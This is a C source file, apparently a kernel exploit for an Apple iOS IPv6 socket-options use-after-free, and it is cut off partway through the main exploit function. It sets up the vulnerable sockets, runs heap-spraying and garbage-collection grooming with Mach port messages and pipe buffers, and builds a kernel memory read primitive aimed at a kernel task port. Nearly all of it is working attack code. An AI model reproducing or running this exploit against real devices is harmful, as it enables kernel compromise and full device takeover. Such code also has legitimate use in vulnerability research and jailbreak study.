//
//  exploit.c
//  se12.0exploit
//
//  Created by Justin Sherman on 1/13/20.
//  Copyright Â© 2020 Justin Sherman. All rights reserved.
//

#include <CoreFoundation/CoreFoundation.h>
#include <errno.h>
#include <pthread/pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "array.h"
#include "exploit.h"

#define CHECK_ERROR(err, errmsg, ...) \
    do { \
        if((err)){ \
            printf(errmsg, ##__VA_ARGS__); \
            return 1; \
        } \
    } while (0)

/* setsockopt accepts vals [1-255] */
static const int INITIAL_TCLASS = 1;

static const uint32_t MINMTU_MAGIC = 0xcafe;
static const uint32_t MINMTU_MAGIC_MASK = 0xffff0000;
static const uint32_t MINMTU_PIPEIDX_MASK = 0x0000ffff;

#define MAGIC_FROM_MINMTU(minmtu) (((minmtu) & MINMTU_MAGIC_MASK) >> 16)
#define PIPEIDX_FROM_MINMTU(minmtu) ((minmtu) & MINMTU_PIPEIDX_MASK)

static const uint64_t LEAKED_PORT_CONTEXT = 0x1122334455667788;

/* static vm_size_t PAGESIZE = 0; */

static const char *HOSTNAME = NULL;

static mach_port_t kalloc(int len){
    mach_port_t recv_port;
    kern_return_t kret = mach_port_allocate(mach_task_self(),
            MACH_PORT_RIGHT_RECEIVE, &recv_port);
    if(kret){
        /* printf("%s: mach_port_allocate %s\n", __func__, mach_error_string(kret)); */
        return MACH_PORT_NULL;
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_port_desc;
    };

    int port_count = len / 8;
    /* calloc for MACH_PORT_NULL */
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));

    struct ool_msg *oolmsg = malloc(sizeof(struct ool_msg));
    oolmsg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg->hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg->hdr.msgh_remote_port = recv_port;
    oolmsg->hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg->hdr.msgh_id = 0xaabbccdd;
    oolmsg->body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg->ool_port_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kret = mach_msg(&oolmsg->hdr, MACH_SEND_MSG, sizeof(*oolmsg), 0,
            MACH_PORT_NULL, 0, MACH_PORT_NULL);

    free(oolmsg);
    free(ports);

    if(kret){
        /* printf("%s: mach_msg kret %s\n", __func__, mach_error_string(kret)); */
        return MACH_PORT_NULL;
    }

    return recv_port;
}

static mach_port_t kalloc_with_port(int len, mach_port_t port){
    mach_port_t recv_port;
    kern_return_t kret = mach_port_allocate(mach_task_self(),
            MACH_PORT_RIGHT_RECEIVE, &recv_port);
    if(kret){
        printf("%s: mach_port_allocate %s\n", __func__, mach_error_string(kret));
        return MACH_PORT_NULL;
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_port_desc;
    };

    int port_count = len / 8;
    /* mach_port_t *ports = calloc(port_count, sizeof(mach_port_t)); */
    mach_port_t *ports = malloc(sizeof(mach_port_t) * port_count);

    for(int i=0; i<port_count; i++){
        ports[i] = port;
    }

    struct ool_msg *oolmsg = malloc(sizeof(struct ool_msg));
    oolmsg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg->hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg->hdr.msgh_remote_port = recv_port;
    oolmsg->hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg->hdr.msgh_id = 0xaabbccdd;
    oolmsg->body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg->ool_port_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kret = mach_msg(&oolmsg->hdr, MACH_SEND_MSG, sizeof(*oolmsg), 0,
            MACH_PORT_NULL, 0, MACH_PORT_NULL);

    free(oolmsg);
    free(ports);

    if(kret){
        printf("%s: mach_msg kret %s\n", __func__, mach_error_string(kret));
        return MACH_PORT_NULL;
    }

    return recv_port;
}

static int create_vulnerable_socket(void){
    int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

    if(s == -1){
        printf("error creating socket: %s\n", strerror(errno));
        return -1;
    }

    struct so_np_extensions ex = {
        .npx_flags = SONPX_SETOPTSHUT,
        .npx_mask = SONPX_SETOPTSHUT
    };
    
    int err = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &ex, sizeof(ex));

    if(err == -1){
        printf("first setsockopt: %s\n", strerror(errno));
        return -1;
    }

    int minmtu = IP6PO_MINMTU_ALL;
    err = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));

    if(err == -1){
        printf("second setsockopt: %s\n", strerror(errno));
        return -1;
    }

    int prefer_tempaddr = IP6PO_TEMPADDR_PREFER;
    err = setsockopt(s, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, &prefer_tempaddr,
            sizeof(prefer_tempaddr));

    if(err == -1){
        printf("third setsockopt: %s\n", strerror(errno));
        return -1;
    }

    int tclass = INITIAL_TCLASS;
    err = setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));

    if(err == -1){
        printf("fourth setsockopt: %s\n", strerror(errno));
        return -1;
    }

    return s;
}

static int get_minmtu(int socket, uint32_t *minmtu){
    socklen_t minmtu_sz = sizeof(*minmtu);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &minmtu_sz);
}

static int get_prefer_tempaddr(int socket, uint32_t *prefer_tempaddr){
    socklen_t sz = sizeof(*prefer_tempaddr);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefer_tempaddr, &sz);
}

static int get_tclass(int socket, uint32_t *tclass){
    socklen_t sz = sizeof(*tclass);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_TCLASS, tclass, &sz);
}

static int increase_file_limit(void){
    struct rlimit rl = {0};

    int err = getrlimit(RLIMIT_NOFILE, &rl);

    if(err){
        printf("%s: getrlimit: %s\n", __func__, strerror(errno));
        return err;
    }

    rl.rlim_cur = OPEN_MAX;
    rl.rlim_max = rl.rlim_cur;

    err = setrlimit(RLIMIT_NOFILE, &rl);

    if(err){
        printf("%s: setrlimit: %s\n", __func__, strerror(errno));
        return err;
    }

    return 0;
}

static int _KernelRead64(int s, int *p, uint64_t kaddr, uint64_t *out){
    struct ip6_pktopts old_pktopts = {0};
    ssize_t r = read(p[0], &old_pktopts, sizeof(old_pktopts));

    if(r == -1){
        printf("%s: read old_pktopts %s\n", __func__, strerror(errno));
        return r;
    }

    struct ip6_pktopts new_pktopts = {0};
    new_pktopts.ip6po_pktinfo = kaddr;

    ssize_t w = write(p[1], &new_pktopts, sizeof(new_pktopts));

    if(w == -1){
        printf("%s: write new_pktopts %s\n", __func__, strerror(errno));
        return w;
    }
    
    struct in6_pktinfo info = {0};
    socklen_t infosz = sizeof(info);

    int err = getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &info, &infosz);

    if(err == -1){
        printf("%s: getsockopt with pktinfo @ %#llx: %s\n", __func__, kaddr,
                strerror(errno));
        return 1;
    }

    /* I know I get 20 bytes from this, but reading 20 bytes at a time is weird */
    *out = *(uint64_t *)&info;

    return 0;
}

static int _KernelRead32(int s, int *p, uint64_t kaddr, uint32_t *out){
    uint64_t out64 = 0;
    if(_KernelRead64(s, p, kaddr, &out64)){
        return 1;
    }

    *out = *(uint32_t *)&out64;

    return 0;
}

static int _KernelReadN(int s, int *p, uint64_t kaddr, uint8_t *out,
        size_t length){
    uint64_t current_loc = kaddr;
    uint64_t end = kaddr + length;

    size_t bytes_read = 0;
    size_t bytes_left = length;

    int ret = 0;

    while(current_loc < end && ret == 0){
        size_t chunk = sizeof(uint32_t);

        if(chunk > bytes_left)
            chunk = bytes_left;

        uint32_t out32 = 0;
        ret = _KernelRead32(s, p, current_loc, &out32);

        *(uint32_t *)(out + bytes_read) = out32;

        bytes_read += chunk;
        current_loc += chunk;
        bytes_left -= chunk;
    }

    return ret;
}

static int _DumpKernelMemory(int s, int *p, uint64_t kaddr, uint32_t len){
    int ret = 0;

    uint32_t bytes_dumped = 0;
    uint64_t current_loc = kaddr;

    while(bytes_dumped < len){
        enum { row_size = 0x10 };

        uint64_t val1 = 0;
        uint64_t val2 = 0;

        ret = _KernelRead64(s, p, current_loc, &val1);

        if(ret)
            return ret;

        ret = _KernelRead64(s, p, current_loc + 8, &val2);

        if(ret)
            return ret;

        uint64_t *buf1 = &val1;
        uint64_t *buf2 = &val2;

        int current_row_length = len - bytes_dumped;

        if(current_row_length >= row_size)
            current_row_length = row_size;

        printf("  %#llx: ", current_loc);

        for(int i=0; i<current_row_length / 2; i++)
            printf("%02x ", *(uint8_t *)((uint8_t *)buf1 + i));
        for(int i=current_row_length / 2; i<current_row_length; i++)
            printf("%02x ", *(uint8_t *)((uint8_t *)buf2 + (i-(current_row_length/2))));

        /* Print filler spaces.
         * Two spaces for would be '%02x', one more for the space after.
         */
        for(int i=current_row_length; i<row_size; i++)
            printf("   ");

        printf("  ");

        for(int i=0; i<current_row_length / 2; i++){
            uint8_t cur_char = *(uint8_t *)((uint8_t *)buf1 + i);
            if(isgraph(cur_char))
                printf("%c", cur_char);
            else
                printf(".");
        }
        for(int i=current_row_length / 2; i<current_row_length; i++){
            uint8_t cur_char = *(uint8_t *)((uint8_t *)buf2 + (i-(current_row_length/2)));
            if(isgraph(cur_char))
                printf("%c", cur_char);
            else
                printf(".");
        }

        printf("\n");

        bytes_dumped += row_size;
        current_loc += row_size;
    }

    return ret;
}

#define KernelRead32(kaddr, out) _KernelRead32(evil_socket, evil_pipe, (kaddr), (out))
#define KernelRead64(kaddr, out) _KernelRead64(evil_socket, evil_pipe, (kaddr), (out))
#define KernelReadN(kaddr, out, len)  _KernelReadN(evil_socket, evil_pipe, (kaddr), (out), (len))
#define DumpKernelMemory(kaddr, len) _DumpKernelMemory(evil_socket, evil_pipe, (kaddr), (len))

extern kern_return_t mach_zone_force_gc(host_t host);

static void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

static void _cleanup(int **pipes, int num_pipes, int *sockets,
        int num_sockets){
        /* mach_port_t **placeholders_before, */
        /* int num_place_holders_before, mach_port_t **placeholders_after, */
        /* int num_place_holders_after){ */
    for(int i=0; i<num_pipes; i++){
            close(*pipes[i]);
            close(*(pipes[i] + 1));
            free(pipes[i]);
    }

    for(int i=0; i<num_sockets; i++)
        close(sockets[i]);

    return;
    /* for(int i=0; i<num_sockets-1; i++){ */
    /*     for(int k=0; k<num_place_holders_before; k++){ */
    /*         mach_port_destroy(mach_task_self(), placeholders_before[i][k]); */
    /*     } */
    /* } */

    /* for(int i=0; i<num_sockets-1; i++){ */
    /*     for(int k=0; k<num_place_holders_after; k++){ */
    /*         mach_port_destroy(mach_task_self(), placeholders_after[i][k]); */
    /*     } */
    /* } */
}

/* #define CLEANUP _cleanup(pipes, num_pipes, sockets, num_sockets, \ */
/*         placeholders_before, num_placeholders_before, placeholders_after, \ */
/*         num_placeholders_after) */

#define CLEANUP _cleanup(pipes, num_pipes, sockets, num_sockets)

/* static int pktopts_pipe_peek(int *p, struct ip6_pktopts **out){ */
/*     struct ip6_pktopts old_pktopts = {0}; */
/*     ssize_t r = read(p[0], &old_pktopts, sizeof(old_pktopts)); */

/*     if(r == -1){ */
/*         printf("%s: read pktopts %s\n", __func__, strerror(errno)); */
/*         return r; */
/*     } */

/*     *out = malloc(sizeof(struct ip6_pktopts)); */
/*     memcpy(*out, &old_pktopts, sizeof(old_pktopts)); */

/*     ssize_t w = write(p[1], &old_pktopts, sizeof(old_pktopts)); */

/*     if(w == -1){ */
/*         printf("%s: write back pktopts %s\n", __func__, strerror(errno)); */
/*         return w; */
/*     } */

/*     return 0; */
/* } */

static int kptr_compar(const void *a, const void *b){
    const void *kptr_a = *(const void **)a;
    const void *kptr_b = *(const void **)b;

    if(kptr_a < kptr_b)
        return -1;
    else if(kptr_a > kptr_b)
        return 1;
    else
        return 0;
}

int exploit(mach_port_t *tfp0out){
    vm_size_t pagesize;
    _host_page_size(mach_host_self(), &pagesize);

    increase_file_limit();

    printf("sizeof(struct ip6_pktopts) = %#x\n", sizeof(struct ip6_pktopts));
    printf("offsetof(struct ip6_pktopts,  ip6po_m) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_m));
printf("offsetof(struct ip6_pktopts,  ip6po_hlim) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_hlim));
printf("offsetof(struct ip6_pktopts,  ip6po_pktinfo) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_pktinfo));

printf("offsetof(struct ip6_pktopts,  ip6po_nhinfo.ip6po_nhi_nexthop) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_nhinfo.ip6po_nhi_nexthop));
printf("offsetof(struct ip6_pktopts,  ip6po_nhinfo.ip6po_nhi_route) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_nhinfo.ip6po_nhi_route));
/* printf("offsetof(struct ip6_pktopts,  ip6po_nhinfo) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_nhinfo)); */
printf("offsetof(struct ip6_pktopts,  ip6po_hbh) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_hbh));
printf("offsetof(struct ip6_pktopts,  ip6po_dest1) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_dest1));

printf("offsetof(struct ip6_pktopts,  ip6po_rhinfo.ip6po_rhi_rthdr) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_rhinfo.ip6po_rhi_rthdr));
printf("offsetof(struct ip6_pktopts,  ip6po_rhinfo.ip6po_rhi_route) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_rhinfo.ip6po_rhi_route));
/* printf("offsetof(struct ip6_pktopts,  ip6po_rhinfo) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_rhinfo)); */
printf("offsetof(struct ip6_pktopts,  ip6po_dest2) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_dest2));
printf("offsetof(struct ip6_pktopts,  ip6po_tclass) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_tclass));
printf("offsetof(struct ip6_pktopts,  ip6po_minmtu) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_minmtu));
printf("offsetof(struct ip6_pktopts,  ip6po_prefer_tempaddr) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_prefer_tempaddr));
printf("offsetof(struct ip6_pktopts,  ip6po_flags) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_flags));

    printf("sizeof(kport_t) = %#x\n", sizeof(kport_t));
    printf("offsetof(kport_t,  ip_bits) = %#x\n", offsetof(kport_t,  ip_bits));
printf("offsetof(kport_t,  ip_references) = %#x\n", offsetof(kport_t,  ip_references));

printf("offsetof(kport_t,  ip_lock.data) = %#x\n", offsetof(kport_t,  ip_lock.data));
printf("offsetof(kport_t,  ip_lock.type) = %#x\n", offsetof(kport_t,  ip_lock.type));
printf("offsetof(kport_t,  ip_lock.pad) = %#x\n", offsetof(kport_t,  ip_lock.pad));

printf("offsetof(kport_t,  ip_messages.port.waitq.flags) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.flags));
printf("offsetof(kport_t,  ip_messages.port.waitq.waitq_interlock) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.waitq_interlock));
printf("offsetof(kport_t,  ip_messages.port.waitq.waitq_set_id) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.waitq_set_id));
printf("offsetof(kport_t,  ip_messages.port.waitq.waitq_prepost_id) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.waitq_prepost_id));

printf("offsetof(kport_t,  ip_messages.port.waitq.waitq_queue.next) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.waitq_queue.next));
printf("offsetof(kport_t,  ip_messages.port.waitq.waitq_queue.prev) = %#x\n", offsetof(kport_t,  ip_messages.port.waitq.waitq_queue.prev));
/* printf("offsetof(kport_t,  waitq_queue) = %#x\n", offsetof(kport_t,  waitq_queue)); */
/* printf("offsetof(kport_t,  waitq) = %#x\n", offsetof(kport_t,  waitq)); */
printf("offsetof(kport_t,  ip_messages.port.messages) = %#x\n", offsetof(kport_t,  ip_messages.port.messages));
printf("offsetof(kport_t,  ip_messages.port.seqno) = %#x\n", offsetof(kport_t,  ip_messages.port.seqno));
printf("offsetof(kport_t,  ip_messages.port.receiver_name) = %#x\n", offsetof(kport_t,  ip_messages.port.receiver_name));
printf("offsetof(kport_t,  ip_messages.port.msgcount) = %#x\n", offsetof(kport_t,  ip_messages.port.msgcount));
printf("offsetof(kport_t,  ip_messages.port.qlimit) = %#x\n", offsetof(kport_t,  ip_messages.port.qlimit));
printf("offsetof(kport_t,  ip_messages.port.pad) = %#x\n", offsetof(kport_t,  ip_messages.port.pad));
/* printf("offsetof(kport_t,  port) = %#x\n", offsetof(kport_t,  port)); */
printf("offsetof(kport_t,  ip_messages.klist) = %#x\n", offsetof(kport_t,  ip_messages.klist));
printf("offsetof(kport_t,  ip_messages) = %#x\n", offsetof(kport_t,  ip_messages));
printf("offsetof(kport_t,  ip_receiver) = %#x\n", offsetof(kport_t,  ip_receiver));
printf("offsetof(kport_t,  ip_kobject) = %#x\n", offsetof(kport_t,  ip_kobject));
printf("offsetof(kport_t,  ip_nsrequest) = %#x\n", offsetof(kport_t,  ip_nsrequest));
printf("offsetof(kport_t,  ip_pdrequest) = %#x\n", offsetof(kport_t,  ip_pdrequest));
printf("offsetof(kport_t,  ip_requests) = %#x\n", offsetof(kport_t,  ip_requests));
printf("offsetof(kport_t,  ip_premsg) = %#x\n", offsetof(kport_t,  ip_premsg));
printf("offsetof(kport_t,  ip_context) = %#x\n", offsetof(kport_t,  ip_context));
printf("offsetof(kport_t,  ip_flags) = %#x\n", offsetof(kport_t,  ip_flags));
printf("offsetof(kport_t,  ip_mscount) = %#x\n", offsetof(kport_t,  ip_mscount));
printf("offsetof(kport_t,  ip_srights) = %#x\n", offsetof(kport_t,  ip_srights));
printf("offsetof(kport_t,  ip_sorights) = %#x\n", offsetof(kport_t,  ip_sorights));

    /* printf("offsetof(kport_t, ip_nsrequest) = %#x\n", offsetof(kport_t, ip_nsrequest)); */
    /* printf("offsetof(kport_t, ip_context) = %#x\n", offsetof(kport_t, ip_context)); */
    /* printf("offsetof(struct ip6_pktopts, ip6po_tclass) = %#x\n", */
    /*         offsetof(struct ip6_pktopts, ip6po_tclass)); */
    /* printf("offsetof(struct ip6_pktopts, ip6po_minmtu) = %#x\n", */
    /*         offsetof(struct ip6_pktopts, ip6po_minmtu)); */
    /* printf("offsetof(struct ip6_pktopts, ip6po_prefer_tempaddr) = %#x\n", */
    /*         offsetof(struct ip6_pktopts, ip6po_prefer_tempaddr)); */
    struct utsname u = {0};
    uname(&u);

    printf("%s %s %s %s %s\n", u.sysname, u.nodename, u.release, u.version,
            u.machine);

    HOSTNAME = u.nodename;

    size_t sz = sizeof(struct ip6_pktopts);
    if(sz == 0xb0 && strcmp(HOSTNAME, "pink") == 0){
        printf("UNCOMMENT ro_lle IN THE route_in6 STRUCT\n");
        return 1;
    }
    else if(sz == 0xc0 && strcmp(HOSTNAME, "blue") == 0){
        printf("COMMENT OUT ro_lle IN THE route_in6 STRUCT\n");
        return 1;
    }

    mach_port_t leaked_port;
    kern_return_t kret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
            &leaked_port);

    if(kret){
        printf("couldn't allocate leaked_port: %s\n", mach_error_string(kret));
        return 1;
    }

    mach_port_set_context(mach_task_self(), leaked_port, 0x1122334455667788);

    kret = mach_port_insert_right(mach_task_self(), leaked_port, leaked_port,
            MACH_MSG_TYPE_MAKE_SEND);

    if(kret){
        printf("couldn't insert send right for leaked_port: %s\n",
                mach_error_string(kret));
        return 1;
    }

    mach_port_t nosenderport = MACH_PORT_NULL;
    kret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &nosenderport);

    if(kret){
        printf("couldn't allocate nosenderport for nsrequest on leaked_port: %s\n",
                mach_error_string(kret));
        return 1;
    }

    /* unused */
    mach_port_t prev = MACH_PORT_NULL;

    /* to disclose address of nosenderport later */
    /* kernel will set ip_nsrequest field of our fake port to point to nosenderport */
    kret = mach_port_request_notification(mach_task_self(), leaked_port,
            MACH_NOTIFY_NO_SENDERS, 0, nosenderport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);

    if(kret){
        printf("couldn't set leaked_port->ip_nsrequest with nosenderport: %s\n",
                mach_error_string(kret));
        return 1;
    }

    int num_pipes = 3100;
    int *pipes[num_pipes];

    for(int i=0; i<num_pipes; i++)
        pipes[i] = malloc(sizeof(int) * 2);

    printf("Making controlled allocations in kalloc.192...\n");

    int num_sockets = 4000;
    int sockets[num_sockets];
    for(int i=0; i<num_sockets; i++)
        sockets[i] = -1;

    int needs_show_msg = 0;
    int already_shown = 0;
    int last_prealloc = 0;

    int num_preallocs = num_sockets*2;
    int prealloc_times_per_loop = 50;
    mach_port_t *preallocs = malloc(sizeof(mach_port_t) * 500000);

    for(int i=0; i<num_sockets; i++){
        /* this will initialize inp_depend6.inp6_outputopts for this socket */
        /* kalloc.192 allocation */
        int s = create_vulnerable_socket();

        if(s == -1){
            printf("Could not create socket %d\n", i);
            return 1;
        }

        sockets[i] = s;
    }

    // XXX 384 MB
    int zone_map_sz = 402653184;
    /* page size allocations, so we know these free pages will get
     * sent back to the zone allocator
     */
    int kzone = pagesize;

    /* fill 90% of the zone map, it's a lot but not so much that it triggers
     * garbage collection early
     */
    int num_kallocs = (zone_map_sz * .90) / kzone;

    printf("Making %d kalloc.%d allocations to free later...\n",
            num_kallocs, kzone);

    for(int i=0; i<num_kallocs; i++){
        mach_port_t p = kalloc(kzone);

        if(p == MACH_PORT_NULL){
            needs_show_msg = 1;
        }
        else{
            preallocs[i] = p;

        }

        if(needs_show_msg && !already_shown){
            printf("Ran out of kalloc.%d mem at %d\n", i, kzone);
            already_shown = 1;
            last_prealloc = i;
            break;
        }
    }

    printf("Freeing the kalloc.192 allocations...\n");

    for(int i=0; i<num_sockets; i++){
        disconnectx(sockets[i], 0, 0);
    }

    printf("Freeing the kalloc.%d allocations...\n", kzone);

    for(int i=0; i<last_prealloc; i++){
        mach_port_destroy(mach_task_self(), preallocs[i]);
    }

    free(preallocs);
    preallocs = NULL;

    int gc_kalloc_zone = pagesize;
    int num_gc_kallocs = (zone_map_sz * .6) / gc_kalloc_zone;

    printf("%d kalloc.%d allocations to try and trigger garbage collection\n",
            num_gc_kallocs, gc_kalloc_zone);

    int gc_brk = 0;
    mach_port_t *gc_ports = malloc(sizeof(mach_port_t) * num_gc_kallocs);

    uint64_t maxtime = 0;
    for(int i=0; i<num_gc_kallocs; i++){
        uint64_t start = mach_absolute_time();
        mach_port_t p = kalloc(gc_kalloc_zone);
        uint64_t end = mach_absolute_time();
        if(p == MACH_PORT_NULL){
            printf("Final kalloc.%d spray: no space @ %d, gc should trigger\n", 
                    gc_kalloc_zone, i);
            break;
        }
        gc_ports[i] = p;
        uint64_t time = end - start;

        if(time > maxtime){
            maxtime = time;
            printf("new maxtime %lld @ %d\n", maxtime, i);
        }
        
        if(time > 100000){
            printf("Maybe gc at %d\n", i);
            gc_brk = i;
            break;
        }
    }

    /* if(gc_brk == 0){ */
    /*     printf("no gc?\n"); */
    /* } */

    int num_gcports = gc_brk != 0 ? gc_brk : num_gc_kallocs;

    for(int i=0; i<num_gcports; i++)
        mach_port_destroy(mach_task_self(), gc_ports[i]);

    free(gc_ports);
    gc_ports = NULL;

    /* create a bunch of kalloc.512 pipe buffers, if all went well,
     * several of our pipe buffers should overlap with the dangling
     * ip6_pktopts structs
     */
    struct ip6_pktopts pipe_spray_opts = {0};
    // XXX note: means nothing, just for fun
    /* pipe_spray_opts.ip6po_pktinfo = 0xfffffff017004000; */

    mach_port_t _512_kallocs[num_pipes];
    int num_kalloc_512s = 0;

    printf("Spraying pipe buffers and kalloc.512 OOL port allocations...\n");

    for(int i=0; i<num_pipes; i++){
        if(pipe(pipes[i])){
            printf("create pipe %d: %s\n", i, strerror(errno));
            CLEANUP;
            return 1;
        }

        pipe_spray_opts.ip6po_minmtu = (MINMTU_MAGIC << 16) | i;

        ssize_t w = 0;
        mach_port_t p = MACH_PORT_NULL;

        int spray_pipe_buffer = ((i % 2) == 0);

        if(spray_pipe_buffer)
            w = write(*(pipes[i] + 1), &pipe_spray_opts, sizeof(pipe_spray_opts));
        else{
            p = kalloc_with_port(512, leaked_port);

            if(p != MACH_PORT_NULL){
                _512_kallocs[i] = p;
                num_kalloc_512s++;
            }
            else{
                printf("no more kalloc.512 space while spraying pipe buffers @ %d\n", i);
            }
        }

        /* go slow, we didn't wait for a possible gc to finish earlier */
        pthread_yield_np();
        usleep(100);

        /* if(i%1000==0) */
        /*     printf("%d\n", i); */

        /* if(w == -1){ */
        /*     printf("write to pipe %d: %s\n", i, strerror(errno)); */
        /*     CLEANUP; */
        /*     return 1; */
        /* } */
    }

    /* int num_post_512_kallocs = (zone_map_sz * .4) / 512; */
    /* mach_port_t *kalloc_512s = malloc(sizeof(mach_port_t) * num_post_512_kallocs); */
    /* for(int i=0; i<num_post_512_kallocs; i++){ */
    /*     mach_port_t p = kalloc_with_port(512, leaked_port); */

    /*     if(p != MACH_PORT_NULL){ */
    /*         kalloc_512s[i] = p; */
    /*     } */
    /*     else{ */
    /*         printf("no more kalloc.512 space while post spraying @  %d\n", i); */
    /*         break; */
    /*     } */
    /* } */

    int evil_socket = -1;
    int *evil_pipe = NULL;

    int FIND_EVIL_SOCKET_DEBUG = 0;
    int FIND_EVIL_SOCKET_DEBUG_LEVEL1 = 0;

    int zero_minmtus = 0;
    int zero_prefer_tempaddrs = 0;
    int zero_tclasses = 0;

    /* struct kread_test { */
    /*     uint64_t kptr; */
    /*     int *pipe; */
    /* }; */ 

    struct array *kernel_pointer_array = array_new();

    printf("Looking for reallocated ip6_pktopts structs and collecting"
            " kernel pointers from them...\n");

    for(int i=0; i<num_sockets; i++){
        uint32_t minmtu = 0;
        if(get_minmtu(sockets[i], &minmtu))
            continue;

        uint32_t prefer_tempaddr = 0;
        if(get_prefer_tempaddr(sockets[i], &prefer_tempaddr))
            continue;

        uint32_t tclass = 0;
        if(get_tclass(sockets[i], &tclass))
            continue;

        uint32_t minmtu_magic = MAGIC_FROM_MINMTU(minmtu);

        if(tclass != IP6PO_TEMPADDR_PREFER && tclass != 0xdeadbeef){
            if(FIND_EVIL_SOCKET_DEBUG){
                if(1){
                    if(FIND_EVIL_SOCKET_DEBUG_LEVEL1){
                        printf("socket %d tclass %#x\n", i, tclass);
                    }
                }
                else{
                    zero_tclasses++;
                }
            }
        }

        if(minmtu_magic == MINMTU_MAGIC){
            evil_socket = sockets[i];
            
            uint32_t possible_evil_pipe = PIPEIDX_FROM_MINMTU(minmtu);

            if(possible_evil_pipe > num_pipes){
                printf("pipe idx (%d) > num_pipes (%d)????\n",
                        possible_evil_pipe, num_pipes);
                CLEANUP;
                return 1;
            }

            evil_pipe = pipes[possible_evil_pipe];
            // XXX XXX XXX uncommented to see if we can get kernel mach port
            // pointers comprised of tclass, minmtu, prefer_tempaddr
            /* break; */
        }
        // XXX IP6PO_MINMTU_ALL was initial value, 0xdeadbeef is spammed sometimes
        else if(minmtu != IP6PO_MINMTU_ALL && minmtu != 0xdeadbeef){
            if(FIND_EVIL_SOCKET_DEBUG){
                if(1){
                    if(FIND_EVIL_SOCKET_DEBUG_LEVEL1){
                        printf("socket %d minmtu %#x minmtu_magic %#x\n", i, minmtu,
                                minmtu_magic);
                    }
                }
                else{
                    zero_minmtus++;
                }
            }
        }


